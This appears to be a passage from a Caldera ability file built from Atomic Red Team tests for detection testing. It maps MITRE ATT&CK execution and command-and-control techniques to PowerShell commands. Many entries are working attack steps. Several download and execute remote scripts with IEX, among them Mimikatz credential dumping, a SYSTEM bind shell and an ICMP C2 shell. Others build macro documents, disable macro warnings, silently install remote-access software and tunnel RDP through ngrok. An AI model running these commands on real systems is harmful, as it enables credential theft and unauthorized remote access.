                    "cleanup": "$CleanupClass = New-Object Management.ManagementClass(New-Object Management.ManagementPath(\"Win32_Atomic\")); try { $CleanupClass.Delete() } catch {}",
                    "command": "$Class = New-Object Management.ManagementClass(New-Object Management.ManagementPath(\"Win32_Process\")); $NewClass = $Class.Derive(\"Win32_Atomic\"); $NewClass.Put(); Invoke-WmiMethod -Path Win32_Atomic -Name create -ArgumentList notepad.exe",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "80cda763aa992b775038ce134c892070",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "80cda763aa992b775038ce134c892070"
    },
    "T1204.003__execution__User Execution: Malicious Image__b939c81cba750f4b3ef67e6b0456b41e": {
        "description": "Adversaries may rely on a user running a malicious image to facilitate execution",
        "tactic": "execution",
        "technique": {
            "attack_id": "T1204.003",
            "name": "User Execution: Malicious Image"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "start-sleep -s 5; stop-process -Name \"Calculatorapp\" -Force ; dismount-diskimage -ImagePath \"$env:TEMP\\qbot-test.iso\"",
                    "command": "IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.003/src/qbot-test.iso\" -OutFile \"$env:TEMP\\qbot-test.iso\"); Mount-DiskImage -ImagePath \"$env:TEMP\\qbot-test.iso\"; $mountedpath = (Get-DiskImage -ImagePath \"$env:TEMP\\qbot-test.iso\" | Get-Volume).DriveLetter; $finalpath = $mountedpath + \":\\\"; cd $finalpath; .\\calc.exe.lnk",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "b939c81cba750f4b3ef67e6b0456b41e",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "b939c81cba750f4b3ef67e6b0456b41e"
    },
    "T1204.002__execution__User Execution: Malicious File__705c4b9714ce06223e7d7038cd332808": {
        "description": "Microsoft Office creating then launching a .bat script from an AppData directory. The .bat file launches calc.exe when opened.",
        "tactic": "execution",
        "technique": {
            "attack_id": "T1204.002",
            "name": "User Execution: Malicious File"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing); $macrocode = \"   Open `\"$(\"$env:temp\\art1204.bat\")`\" For Output As #1`n   Write #1, `\"calc.exe`\"`n   Close #1`n   a = Shell(`\"cmd.exe /c $bat_path `\", vbNormalFocus)`n\"; Invoke-MalDoc -macroCode $macrocode -officeProduct Word",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "705c4b9714ce06223e7d7038cd332808",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "705c4b9714ce06223e7d7038cd332808"
    },
    "T1059.001__execution__Command and Scripting Interpreter: PowerShell__90c76bd616efee6d7c98dc6c1dcc6e99": {
        "description": "Run mimikatz via PsSendKeys. Upon execution, automated actions will take place to open file explorer, open notepad and input code, then mimikatz dump info will be displayed.\n",
        "tactic": "execution",
        "technique": {
            "attack_id": "T1059.001",
            "name": "Command and Scripting Interpreter: PowerShell"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$url='https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1';$wshell=New-Object -ComObject WScript.Shell;$reg='HKCU:\\Software\\Microsoft\\Notepad';$app='Notepad';$props=(Get-ItemProperty $reg);[Void][System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms');@(@('iWindowPosY',([String]([System.Windows.Forms.Screen]::AllScreens)).Split('}')[0].Split('=')[5]),@('StatusBar',0))|ForEach{SP $reg (Item Variable:_).Value[0] (Variable _).Value[1]};$curpid=$wshell.Exec($app).ProcessID;While(!($title=GPS|?{(Item Variable:_).Value.id-ieq$curpid}|ForEach{(Variable _).Value.MainWindowTitle})){Start-Sleep -Milliseconds 500};While(!$wshell.AppActivate($title)){Start-Sleep -Milliseconds 500};$wshell.SendKeys('^o');Start-Sleep -Milliseconds 500;@($url,(' '*1000),'~')|ForEach{$wshell.SendKeys((Variable _).Value)};$res=$Null;While($res.Length -lt 2){[Windows.Forms.Clipboard]::Clear();@('^a','^c')|ForEach{$wshell.SendKeys((Item Variable:_).Value)};Start-Sleep -Milliseconds 500;$res=([Windows.Forms.Clipboard]::GetText())};[Windows.Forms.Clipboard]::Clear();@('%f','x')|ForEach{$wshell.SendKeys((Variable _).Value)};If(GPS|?{(Item Variable:_).Value.id-ieq$curpid}){@('{TAB}','~')|ForEach{$wshell.SendKeys((Item Variable:_).Value)}};@('iWindowPosDY','iWindowPosDX','iWindowPosY','iWindowPosX','StatusBar')|ForEach{SP $reg (Item Variable:_).Value $props.((Variable _).Value)};IEX($res);invoke-mimikatz -dumpcr",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "90c76bd616efee6d7c98dc6c1dcc6e99",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "90c76bd616efee6d7c98dc6c1dcc6e99"
    },
    "T1059.001__execution__Command and Scripting Interpreter: PowerShell__48a861eb5802bd7abdaa64b4fcd30924": {
        "description": "This test requires the manual installation of PowerShell V2.\n\nAttempts to run powershell commands in version 2.0 https://www.leeholmes.com/blog/2017/03/17/detecting-and-preventing-powershell-downgrade-attacks/\n",
        "tactic": "execution",
        "technique": {
            "attack_id": "T1059.001",
            "name": "Command and Scripting Interpreter: PowerShell"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "if(2 -in $PSVersionTable.PSCompatibleVersions.Major) { ; } else {Write-Host  Automated installer not implemented yet, please install PowerShell v2 manually};  ;  powershell.exe -version 2 -Command Write-Host $PSVersion",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "48a861eb5802bd7abdaa64b4fcd30924",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "48a861eb5802bd7abdaa64b4fcd30924"
    },
    "T1059.003__execution__Command and Scripting Interpreter: Windows Command Shell__f5cef6032e9bace6a1938456ac5a5cfb": {
        "description": "Creates and executes a simple batch script. Upon execution, CMD will briefly launch to run the batch script then close again.\n",
        "tactic": "execution",
        "technique": {
            "attack_id": "T1059.003",
            "name": "Command and Scripting Interpreter: Windows Command Shell"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1059.003_script.bat\" -Force -ErrorAction Ignore",
                    "command": "Start-Process \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1059.003_script.bat\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "f5cef6032e9bace6a1938456ac5a5cfb",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "f5cef6032e9bace6a1938456ac5a5cfb"
    },
    "T1059.003__execution__Command and Scripting Interpreter: Windows Command Shell__942d94dff3cc494bacf5517e775321a7": {
        "description": "This test attempts to open a file a specified number of times in Wordpad, then prints the contents. \nIt is designed to mimic BlackByte ransomware's print bombing technique, where tree.dll, which contains the ransom note, is opened in Wordpad 75 times and then printed. \nSee https://redcanary.com/blog/blackbyte-ransomware/. \n",
        "tactic": "execution",
        "technique": {
            "attack_id": "T1059.003",
            "name": "Command and Scripting Interpreter: Windows Command Shell"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "stop-process -name wordpad -force -erroraction silentlycontinue",
                    "command": "cmd /c \"for /l %x in (1,1,75) do start wordpad.exe /p PathToAtomicsFolder\\..\\ExternalPayloads\\T1059_003note.txt\" | out-null",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "942d94dff3cc494bacf5517e775321a7",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "942d94dff3cc494bacf5517e775321a7"
    },
    "T1059.001__execution__Command and Scripting Interpreter: PowerShell__bba7fe7940f8719efa3c38e54ec79e2c": {
        "description": "Connect to a remote powershell session and interact with the host.\nUpon execution, network test info and 'T1086 PowerShell Session Creation and Use' will be displayed.\n",
        "tactic": "execution",
        "technique": {
            "attack_id": "T1059.001",
            "name": "Command and Scripting Interpreter: PowerShell"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "Try {;     New-PSSession -ComputerName $env:COMPUTERNAME -ErrorAction Stop | Out-Null;      ; } ; Catch {;     Enable-PSRemoting; };  ;  New-PSSession -ComputerName $env:COMPUTERNAME; Test-Connection $env:COMPUTERNAME; Set-Content -Path $env:TEMP\\T1086_PowerShell_Session_Creation_and_Use -Value \"T1086 PowerShell Session Creation and Use\"; Get-Content -Path $env:TEMP\\T1086_PowerShell_Session_Creation_and_Use; Remove-Item -Force $env:TEMP\\T1086_PowerShell_Session_Creation_and_Use",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "bba7fe7940f8719efa3c38e54ec79e2c",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "bba7fe7940f8719efa3c38e54ec79e2c"
    },
    "T1204.002__execution__User Execution: Malicious File__03a80d4a4c02d99295b5901ee695cc79": {
        "description": "The Potentially Unwanted Applications (PUA) protection feature in antivirus software can identify and block PUAs from downloading and installing on endpoints in your network. These applications are not considered viruses, malware, or other types of threats, but might perform actions on endpoints that adversely affect their performance or use. This file is similar to EICAR test virus file, but is considered a Potentially Unwanted Application (PUA) instead of a VIRUS (i.e. not actually malicious, but is flagged as it to verify anti-pua protection).\n",
        "tactic": "execution",
        "technique": {
            "attack_id": "T1204.002",
            "name": "User Execution: Malicious File"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Stop-Process -name PotentiallyUnwanted; Remove-Item $env:TEMP/PotentiallyUnwanted.exe -ErrorAction Ignore",
                    "command": "Invoke-WebRequest http://amtso.eicar.org/PotentiallyUnwanted.exe -OutFile $env:TEMP/PotentiallyUnwanted.exe; & \"$env:TEMP/PotentiallyUnwanted.exe\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "03a80d4a4c02d99295b5901ee695cc79",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "03a80d4a4c02d99295b5901ee695cc79"
    },
    "T1059.001__execution__Command and Scripting Interpreter: PowerShell__0f3401d54f59bc1c3eca134ad5d8a774": {
        "description": "Upon execution SharpHound will be downloaded to disk, imported and executed. It will set up collection methods, run and then compress and store the data to the temp directory on the machine. If system is unable to contact a domain, proper execution will not occur.\n\nSuccessful execution will produce stdout message stating \"SharpHound Enumeration Completed\". Upon completion, final output will be a *BloodHound.zip file.\n",
        "tactic": "execution",
        "technique": {
            "attack_id": "T1059.001",
            "name": "Command and Scripting Interpreter: PowerShell"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item $env:Temp\\*BloodHound.zip -Force",
                    "command": "import-module \"PathToAtomicsFolder\\..\\ExternalPayloads\\SharpHound.ps1\"; try { Invoke-BloodHound -OutputDirectory $env:Temp }; catch { $_; exit $_.Exception.HResult}; Start-Sleep 5",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "0f3401d54f59bc1c3eca134ad5d8a774",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "0f3401d54f59bc1c3eca134ad5d8a774"
    },
    "T1204.002__execution__User Execution: Malicious File__a45769d74eb1c75ff916b121023bde31": {
        "description": "Emulates the JS -> MSI chain of the MirrorBlast T505 campaign by executing an xlsm file designed. \nRequires the 32 bit version of Office to run. [MirrorBlast Campaign Analysis](https://blog.morphisec.com/explosive-new-mirrorblast-campaign-targets-financial-companies)\n",
        "tactic": "execution",
        "technique": {
            "attack_id": "T1204.002",
            "name": "User Execution: Malicious File"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "reg delete \"HKCU\\SOFTWARE\\Microsoft\\Office\\16.0\\Excel\\Security\" /v \"VBAWarnings\" /f",
                    "command": "Cd \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\"; New-ItemProperty -Path Registry::HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Office\\16.0\\Excel\\Security -Name \"VBAWarnings\" -Value \"1\" -PropertyType DWORD -Force | Out-Null; & '.\\Excel 2016.lnk' \"PathToAtomicsFolder\\T1204.002\\bin\\mirrorblast_emulation.xlsm\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "a45769d74eb1c75ff916b121023bde31",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "a45769d74eb1c75ff916b121023bde31"
    },
    "T1204.002__execution__User Execution: Malicious File__623806a6fd4d832b6692eb275535f636": {
        "description": "This module creates an Excel 4 Macro (XLM) enabled spreadsheet and executes it. The XLM will first write a \"malicious\"\nVBS file to %TEMP%, then execute this file. The VBS will download Process Explorer to the same directory (%TEMP%) and exec.\n\nA note regarding this module. By default, this module will pull the current username from the system and places it into the macro. If\nyou'd like to utilize the \"=GET.WORKSPACE(26)\" method, that many maldoc authors use, you will need to ensure that the User Name associated\nwith Excel matches that of the local system. This username can be found under Files -> Options -> Username\n",
        "tactic": "execution",
        "technique": {
            "attack_id": "T1204.002",
            "name": "User Execution: Malicious File"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Stop-Process -Name \"procexp*\" -ErrorAction Ignore; Remove-Item \"$env:TEMP\\atomic_redteam_x4m_exec.vbs\" -ErrorAction Ignore; Remove-Item \"$env:TEMP\\procexp.exe\" -ErrorAction Ignore",
                    "command": "$fname = \"$env:TEMP\\atomic_redteam_x4m_exec.vbs\"; $fname1 = \"$env:TEMP\\procexp.exe\"; if (Test-Path $fname) {;   Remove-Item $fname;   Remove-Item $fname1; }; $xlApp = New-Object -COMObject \"Excel.Application\"; $xlApp.Visible = $True; $xlApp.DisplayAlerts = $False; $xlBook = $xlApp.Workbooks.Add(); $sheet = $xlBook.Excel4MacroSheets.Add(); if (\"$env:Username\" -ne \"\") {;   $sheet.Cells.Item(1,1) = \"$env:Username\"; } else {;   $sheet.Cells.Item(1,1) = \"=GET.WORKSPACE(26)\"; }; $sheet.Cells.Item(2,1) = \"procexp.exe\"; $sheet.Cells.Item(3,1) = \"atomic_redteam_x4m_exec.vbs\"; $sheet.Cells.Item(4,1) = \"=IF(ISNUMBER(SEARCH(`\"64`\",GET.WORKSPACE(1))), GOTO(A5),)\"; $sheet.Cells.Item(5,1) = \"=FOPEN(`\"C:\\Users\\`\"&A1&`\"\\AppData\\Local\\Temp\\`\"&A3&`\"`\", 3)\"; $sheet.Cells.Item(6,1) = \"=FWRITELN(A5, `\"url = `\"`\"https://live.sysinternals.com/procexp.exe`\"`\"`\")\"; $sheet.Cells.Item(7,1) = \"=FWRITELN(A5, `\"`\")\"; $sheet.Cells.Item(8,1) = \"=FWRITELN(A5, `\"Set winHttp = CreateObject(`\"`\"WinHTTP.WinHTTPrequest.5.1`\"`\")`\")\"; $sheet.Cells.Item(9,1) = \"=FWRITELN(A5, `\"winHttp.Open `\"`\"GET`\"`\", url, False`\")\"; $sheet.Cells.Item(10,1) = \"=FWRITELN(A5, `\"winHttp.Send`\")\"; $sheet.Cells.Item(11,1) = \"=FWRITELN(A5, `\"If winHttp.Status = 200 Then`\")\"; $sheet.Cells.Item(12,1) = \"=FWRITELN(A5, `\"Set oStream = CreateObject(`\"`\"ADODB.Stream`\"`\")`\")\"; $sheet.Cells.Item(13,1) = \"=FWRITELN(A5, `\"oStream.Open`\")\"; $sheet.Cells.Item(14,1) = \"=FWRITELN(A5, `\"oStream.Type = 1`\")\"; $sheet.Cells.Item(15,1) = \"=FWRITELN(A5, `\"oStream.Write winHttp.responseBody`\")\"; $sheet.Cells.Item(16,1) = \"=FWRITELN(A5, `\"oStream.SaveToFile `\"`\"C:\\Users\\`\"&A1&`\"\\AppData\\Local\\Temp\\`\"&A2&`\"`\"`\", 2`\")\"; $sheet.Cells.Item(17,1) = \"=FWRITELN(A5, `\"oStream.Close`\")\"; $sheet.Cells.Item(18,1) = \"=FWRITELN(A5, `\"End If`\")\"; $sheet.Cells.Item(19,1) = \"=FCLOSE(A5)\"; $sheet.Cells.Item(20,1) = \"=EXEC(`\"explorer.exe C:\\Users\\`\"&A1&`\"\\AppData\\Local\\Temp\\`\"&A3&`\"`\")\"; $sheet.Cells.Item(21,1) = \"=WAIT(NOW()+`\"00:00:05`\")\"; $sheet.Cells.Item(22,1) = \"=EXEC(`\"explorer.exe C:\\Users\\`\"&A1&`\"\\AppData\\Local\\Temp\\`\"&A2&`\"`\")\"; $sheet.Cells.Item(23,1) = \"=HALT()\"; $sheet.Cells.Item(1,1).Name = \"runme\"; $xlApp.Run(\"runme\"); $xlApp.Quit(); [System.Runtime.Interopservices.Marshal]::ReleaseComObject($xlBook) | Out-Null; [System.Runtime.Interopservices.Marshal]::ReleaseComObject($xlApp) | Out-Null; [System.GC]::Collect(); [System.GC]::WaitForPendingFinalizers(); Remove-Variable xlBook; Remove-Variable xlApp",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "623806a6fd4d832b6692eb275535f636",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "623806a6fd4d832b6692eb275535f636"
    },
    "T1106__execution__Native API__2ca71106ee0aff2eda551bb6ed2b39e4": {
        "description": "Get SYSTEM shell - Bind System Shell using CreateProcess technique via function of WinPwn",
        "tactic": "execution",
        "technique": {
            "attack_id": "T1106",
            "name": "Native API"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/CreateProcess/Get-CreateProcessSystemBind.ps1')",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "2ca71106ee0aff2eda551bb6ed2b39e4",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "2ca71106ee0aff2eda551bb6ed2b39e4"
    },
    "T1204.002__execution__User Execution: Malicious File__ab1b50880382b06d48d3d23ad1786239": {
        "description": "This Test uses a VBA macro to execute cmd with flags observed in recent maldoc and 2nd stage downloaders. Upon execution, CMD will be launched.\nExecution is handled by [Invoke-MalDoc](https://github.com/redcanaryco/invoke-atomicredteam/blob/master/Public/Invoke-MalDoc.ps1) to load and execute VBA code into Excel or Word documents.\n",
        "tactic": "execution",
        "technique": {
            "attack_id": "T1204.002",
            "name": "User Execution: Malicious File"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing); $macrocode = \"  a = Shell(`\"cmd.exe /c choice /C Y /N /D Y /T 3`\", vbNormalFocus)\"; Invoke-MalDoc -macroCode $macrocode -officeProduct \"Word\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "ab1b50880382b06d48d3d23ad1786239",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "ab1b50880382b06d48d3d23ad1786239"
    },
    "T1095__command-and-control__Non-Application Layer Protocol__9ed218029d8392d2b4fdedd0f44bb052": {
        "description": "This will attempt to  start C2 Session Using ICMP. For information on how to set up the listener\nrefer to the following blog: https://www.blackhillsinfosec.com/how-to-c2-over-icmp/\n",
        "tactic": "command-and-control",
        "technique": {
            "attack_id": "T1095",
            "name": "Non-Application Layer Protocol"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "IEX (New-Object System.Net.WebClient).Downloadstring('https://raw.githubusercontent.com/samratashok/nishang/c75da7f91fcc356f846e09eab0cfd7f296ebf746/Shells/Invoke-PowerShellIcmp.ps1'); Invoke-PowerShellIcmp -IPAddress",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "9ed218029d8392d2b4fdedd0f44bb052",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "9ed218029d8392d2b4fdedd0f44bb052"
    },
    "T1572__command-and-control__Protocol Tunneling__45f462c09f28d5b0819af7b1ed0913e1": {
        "description": "This test simulates an infected host returning data to a command and control server using long domain names.\nThe simulation involves sending DoH queries that gradually increase in length until reaching the maximum length. The intent is to test the effectiveness of detection of DoH queries for long domain names over a set threshold.\n Upon execution, DNS information about the domain will be displayed for each callout in a JSON format.\n",
        "tactic": "command-and-control",
        "technique": {
            "attack_id": "T1572",
            "name": "Protocol Tunneling"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "Set-Location \"PathToAtomicsFolder\"; .\\T1572\\src\\T1572-doh-domain-length.ps1 -DohServer",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "45f462c09f28d5b0819af7b1ed0913e1",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "45f462c09f28d5b0819af7b1ed0913e1"
    },
    "T1105__command-and-control__Ingress Tool Transfer__04d33ddae0126966ae6d841267c17329": {
        "description": "Use IMEWDBLD.exe (built-in to windows) to download a file. This will throw an error for an invalid dictionary file.\nDownloaded files can be found in \"%LocalAppData%\\Microsoft\\Windows\\INetCache\\<8_RANDOM_ALNUM_CHARS>/<FILENAME>[1].<EXTENSION>\" or `%LocalAppData%\\Microsoft\\Windows\\INetCache\\IE\\<8_RANDOM_ALNUM_CHARS>/<FILENAME>[1].<EXTENSION>.\nRun \"Get-ChildItem -Path C:\\Users\\<USERNAME>\\AppData\\Local\\Microsoft\\Windows\\INetCache\\ -Include <FILENAME>* -Recurse -Force -File -ErrorAction SilentlyContinue\" without quotes and adding the correct username and file name to locate the file.\n",
        "tactic": "command-and-control",
        "technique": {
            "attack_id": "T1105",
            "name": "Ingress Tool Transfer"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "$inetcache = $env:LOCALAPPDATA + \"\\Microsoft\\Windows\\INetCache\\\" ; $file_to_be_removed = [string[]] (Get-ChildItem -Path $inetcache -Include T1105* -Recurse -Force -File -ErrorAction SilentlyContinue); if(\"\" -ne \"$file_to_be_removed\") { Remove-Item \"$file_to_be_removed\" -ErrorAction Ignore }",
                    "command": "$imewdbled = $env:SystemRoot + \"\\System32\\IME\\SHARED\\IMEWDBLD.exe\"; & $imewdbled https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1105/T1105.yaml",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "04d33ddae0126966ae6d841267c17329",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "04d33ddae0126966ae6d841267c17329"
    },
    "T1572__command-and-control__Protocol Tunneling__f49909057fa568660a6f268b7261e446": {
        "description": "Download and run ngrok. Create tunnel to chosen port.\n",
        "tactic": "command-and-control",
        "technique": {
            "attack_id": "T1572",
            "name": "Protocol Tunneling"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item C:\\Users\\Public\\ngrok -Recurse -ErrorAction Ignore; Remove-Item C:\\%userprofile%\\AppData\\Local\\ngrok -ErrorAction Ignore",
                    "command": "C:\\Users\\Public\\ngrok\\ngrok.exe config add-authtoken N/A | Out-Null; Start-Job -ScriptBlock { C:\\Users\\Public\\ngrok\\ngrok.exe tcp 3389 } | Out-Null; Start-Sleep -s 5 ; Stop-Job -Name Job1 | Out-Null",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "f49909057fa568660a6f268b7261e446",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "f49909057fa568660a6f268b7261e446"
    },
    "T1071.001__command-and-control__Application Layer Protocol: Web Protocols__ef2c951840423ba90c208867dcf89c87": {
        "description": "This test simulates an infected host beaconing to command and control. Upon execution, no output will be displayed. \nUse an application such as Wireshark to record the session and observe user agent strings and responses.\n\nInspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat\n",
        "tactic": "command-and-control",
        "technique": {
            "attack_id": "T1071.001",
            "name": "Application Layer Protocol: Web Protocols"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "Invoke-WebRequest www.google.com -UserAgent \"HttpBrowser/1.0\" | out-null; Invoke-WebRequest www.google.com -UserAgent \"Wget/1.9+cvs-stable (Red Hat modified)\" | out-null; Invoke-WebRequest www.google.com -UserAgent \"Opera/8.81 (Windows NT 6.0; U; en)\" | out-null; Invoke-WebRequest www.google.com -UserAgent \"*<|>*\" | out-null",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "ef2c951840423ba90c208867dcf89c87",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "ef2c951840423ba90c208867dcf89c87"
    },
    "T1219__command-and-control__Remote Access Software__9332aff267b00ede37b09606340ee1dc": {
        "description": "An adversary may attempt to trick the user into downloading ScreenConnect for use as a C2 channel. Download of ScreenConnect installer will be in the Downloads directory.\nMsiexec will be used to quietly insall ScreenConnect.\n",
        "tactic": "command-and-control",
        "technique": {
            "attack_id": "T1219",
            "name": "Remote Access Software"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "$installer = \"C:\\Users\\$env:username\\Downloads\\ScreenConnect.msi\"; msiexec /x $installer /qn",
                    "command": "$installer = \"C:\\Users\\$env:username\\Downloads\\ScreenConnect.msi\"; Invoke-WebRequest -OutFile $installer \"https://d1kuyuqowve5id.cloudfront.net/ScreenConnect_21.11.4237.7885_Release.msi\"; msiexec /i $installer /qn",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "9332aff267b00ede37b09606340ee1dc",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "9332aff267b00ede37b09606340ee1dc"
    },
    "T1105__command-and-control__Ingress Tool Transfer__b0e28215c59037cc6cdb61b38615c32d": {
        "description": "Use PowerShell to download and write an arbitrary file from the internet. Example is from the 2021 Threat Detection Report by Red Canary.\n",
        "tactic": "command-and-control",
        "technique": {
            "attack_id": "T1105",
            "name": "Ingress Tool Transfer"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/4042cb3433bce024e304500dcfe3c5590571573a/LICENSE.txt') | Out-File LICENSE.txt; Invoke-Item LICENSE.txt",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
